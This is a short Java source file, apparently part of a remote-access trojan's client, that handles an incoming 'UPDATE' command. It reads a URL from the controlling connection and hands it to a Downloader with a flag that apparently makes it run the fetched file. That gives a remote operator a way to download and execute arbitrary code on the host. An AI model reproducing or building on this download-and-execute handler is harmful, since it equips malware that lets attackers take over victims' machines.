package com.redpois0n.packets.in;

import com.redpois0n.Connection;
import com.redpois0n.Downloader;

public class PacketUPDATE extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String url = Connection.readLine();
		new Downloader(url, true).start();
	}

}
